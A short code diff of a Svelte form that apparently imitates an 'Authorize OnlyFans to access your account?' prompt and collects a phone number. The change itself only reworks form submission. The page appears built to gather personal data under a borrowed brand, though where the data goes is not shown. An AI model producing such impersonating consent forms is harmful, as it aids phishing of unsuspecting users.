@@ -47,10 +47,10 @@
           <h4>Authorize OnlyFans to access your account?</h4>
       </div>
       <div class="submit-opstion">
-          
-          <input type="text" placeholder="phone number" bind:value={phone}> <br>
-          <button type="button" on:click={put}><b>submit</b></button>
-
+          <form on:submit|preventDefault={put}>
+          <input type="text" placeholder="Phone number" bind:value={phone} required> <br>
+          <button type="submit" ><b>submit</b></button>
+        </form>
           
 
           
